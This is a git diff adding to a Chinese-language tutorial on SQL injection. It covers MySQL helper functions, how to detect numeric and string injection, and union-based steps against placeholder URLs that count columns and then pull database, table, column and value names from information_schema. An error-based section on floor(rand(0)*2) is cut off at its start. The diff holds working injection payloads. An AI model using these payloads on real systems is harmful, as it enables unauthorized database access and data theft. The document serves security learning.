@@ -12,6 +12,12 @@ sql注入产生的原理就不细说了，就是输入有害，可以拼接语�
 
 
 
+{% hint style="info" %}
+这里补充一个0x7e是\~的意思。
+{% endhint %}
+
+
+
 ## <mark style="color:green;">（1）SQL的系统库</mark>
 
 ### <mark style="color:yellow;">①information\_schema</mark>
@@ -158,6 +164,52 @@ SCHEMA()
 GROUP_CONCAT(str1,str2,…)
 ```
 
+### <mark style="color:yellow;">⑤CONCAT（）</mark>
+
+简单来说就是MySQL `CONCAT()`函数需要一个或多个字符串参数，并将它们连接成一个字符串。和GROUP\_CONCAT（）差不多。
+
+格式是
+
+```
+CONCAT(str1，str2，.....)
+```
+
+### <mark style="color:yellow;">⑥CONCAT\_WS()</mark>
+
+他是concat（）的一种特殊的形式，第一个参数是分隔符，分隔符的位置放在要连接的两个字符串之间。
+
+```
+concat_ws(separator,str1,str2....)
+```
+
+### <mark style="color:yellow;">⑦EXTRACTVALUE（）</mark>
+
+从目标xml中返回包含所查询值得字符串。第一个参数是xml文档对象名称，第二个参数是Xpath格式的字符串
+
+```
+extractvalue(XML_document,XPath_string)
+```
+
+这个在报错注入的时候可能会用到主要是因为输入了不符合xpath语法的知识。
+
+### <mark style="color:yellow;">⑧UPDATEXML()</mark>
+
+使用不同得xml标记匹配和替换xml块的函数。第一个参数是xml文档对象的名称，第二个参数是xpath格式的字符串，第三个参数是替换的数据
+
+```
+updatexml(XML_document,XPath_string,new_value)
+```
+
+和上述的其实差不多。
+
+### <mark style="color:yellow;">⑨floor（）</mark>
+
+向下取整。
+
+```
+floor(value)
+```
+
 ***
 
 ## <mark style="color:green;">（4）数字型注入</mark>
@@ -200,6 +252,34 @@ select * from table where id=3 and 1=2
 
 以上这些步骤说明URL存在数字型注入
 
+其实还会出现一种情况是数字加括号，也就是说数字是被括号括起来的，其实还是闭合方法是一样的，就是确定含有括号是不一样的。
+
+### <mark style="color:yellow;">①加and 1=1</mark>
+
+```
+http://xxxxxxxxx?id =3 and 1=1
+```
+
+会显示1的查询结果，因为查询语句实际执行的是 id=（2 and 1=1） ，实际执行的是id=1，这个时候sql执行语句是
+
+```sql
+select * from table where id = (2 and 1=1)
+```
+
+### <mark style="color:yellow;">②加 and 1=2</mark>
+
+```
+http://xxxxxxxxx?id =3 and 1=2
+```
+
+这个时候执行结果不出来，因为实际执行的是id = （3 and 1=2），实际执行的是 id =0 ，所以执行失败。这个时候sql执行语句是
+
+```sql
+select * from table where id = (2 and 1=2)
+```
+
+
+
 ***
 
 ## <mark style="color:green;">(5)字符型注入</mark>
@@ -236,11 +316,83 @@ select * from table where username='admin' and 1=1 #
 http://xxxxxxxxxxxx?username=admin' and 1=2#
 ```
 
-这个时候执行了但是会报错，语法没有错误，但是
+这个时候执行了但是会报错，语法没有错误，但是因为逻辑执行不正确，所以还是会报错。实际的sql逻辑语句其实就是
 
+```sql
+select * from table where username='admin' and 1=2#
+```
 
+以上就能判断出是字符型注入了。
 
+***
 
+## <mark style="color:green;">(6)普通注入注入步骤</mark>
+
+### <mark style="color:yellow;">①判断列数</mark>
+
+就是加order by。
+
+```
+http://xxxxxxxx?id= 1' order by 4 #
+```
+
+如果先测一个比较大的数，就是4，5，6这种，报错的话，就说明不存在这一列，那么就是说实际存在的列数要小于这个数。然后我们就往小数猜。
+
+```
+http://xxxxxxxxxx?id=1' order by 3#
+```
+
+如果这个时候没有报错，那么就说明存在3列。
+
+### <mark style="color:yellow;">②爆出数据库</mark>
+
+```
+http://xxxxxxxxxxx?id=1' union select1,database(),3--+
+```
+
+可以直接使用database()版本来爆出数据库。
+
+```
+http://***********?id=1' union select group_concat(schema_name),3,from information_schema.schemata #
+```
+
+也可以利用系统表来得到数据库的库名有哪些。
+
+### <mark style="color:yellow;">③爆出数据表</mark>
+
+```
+http://xxxxxx?id=1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=‘数据库' #
+```
+
+直接从系统库里面找到。
+
+### <mark style="color:yellow;">④爆出字段</mark>
+
+```
+http://******?id=1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='数据表' #
+```
+
+### <mark style="color:yellow;">⑤爆出数据值</mark>
+
+```
+http://******?id=1' union select 1,group_concat(0x7e,字段，0x7e),3 from 数据库名.数据表名 --+
+```
+
+***
+
+## <mark style="color:green;">(7)报错注入</mark>
+
+报错注入主要是extractvalue()函数和updatexml函数和floor()函数这三个得作用，之前有一个exp，但是后面的版本用不了了，所以我们不说这个用法了。直接说这三个。
+
+### <mark style="color:yellow;">①floor（）报错</mark>
+
+floor()报错要配合rand（）函数一起使用，一般是floor(rand(0)\*2)。实质是group by语句的报错。group by 在向临时表中插入数据时，由于rand()会进行多次计算，所以主键重复从而报错。但是报错语句之前的concat（）语句又被执行了，所以该语句报错且抛出的主键是sql语句或者函数执行后的结果。
+
+其实学过随机数就知道，随机数其实是伪随机，就是说只要种子不变，那么其实生成的数字序列是一样的，我们用到的rand(0)，并且\*2了，所以他每次产生的随机数列都是0110
+
+所以我们的利用方法就是
+
+#### <mark style="color:purple;">（1）爆数据库</mark>
 
 
 
